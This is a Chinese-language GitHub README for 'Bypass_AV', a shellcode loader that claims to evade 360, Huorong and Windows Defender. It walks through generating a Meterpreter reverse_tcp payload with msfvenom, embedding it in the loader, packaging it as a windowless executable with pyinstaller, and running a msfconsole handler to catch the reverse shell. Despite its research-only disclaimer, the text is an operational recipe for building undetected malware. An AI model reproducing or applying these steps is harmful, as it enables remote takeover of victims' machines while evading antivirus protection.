# Bypass_AV
Bypass_AV msf免杀，ShellCode免杀加载器 ，免杀shellcode执行程序 ，360&amp;火绒&amp;Window Defender

## 声明

#### 该项目仅供网络安全研究使用，禁止使用该项目进行违法操作，否则自行承担后果，请各位遵守《中华人民共和国网络安全法》！！！


代码未经过大量测试，如发现问题请提交 issue。

## 环境
2022年5月8日 测试可以免杀国内杀软 火绒&360及Window Defender

Windows 10 64位   360&火绒&Window Defender

Windows 7 64位  或以上操作系统应该都没问题（没有测试）


编译

Python  3.8.6

pyinstaller 4.7

## 使用msfvenom

生成ShellCode

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.100 lport=8080 --encrypt base64 -f c
```

注意：ShellCode 需要是64位的

![image-20220508135022087](images/%E5%85%8D%E6%9D%80/image-20220508135022087.png)

## 加载器

将生成的ShellCode 填至 Bypass_AV.py 里的 ShellCode = '''**ShellCode**''' 处

注意：保留原始ShellCode 里的双引号 "

示例：

![](images/%E5%85%8D%E6%9D%80/image-20220508134821387.png)

最终格式：

![](images/%E5%85%8D%E6%9D%80/image-20220508135655093.png)



## 打包成可执行程序

```
pip install pyinstaller 
pyinstaller -F -w Bypss_AV.py
```

生成Bypass_AV.exe在dist目录中



## 运行监听

```
msfconsole
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > run
```



### Bypass_360

https://user-images.githubusercontent.com/34683107/167286045-fa57c2d8-2988-42c3-ae46-c39e35dde9af.mp4


### Bypass_火绒


https://user-images.githubusercontent.com/34683107/167286060-1085a75a-3b7e-4cd7-a6f7-ac4c28fe3e33.mp4


### Bypass_Window Defender


https://user-images.githubusercontent.com/34683107/167286066-c7324967-2f46-48ed-aaf4-4a219997ba55.mp4



感谢阅读

![](images/%E5%85%8D%E6%9D%80/Axx8.jpg)
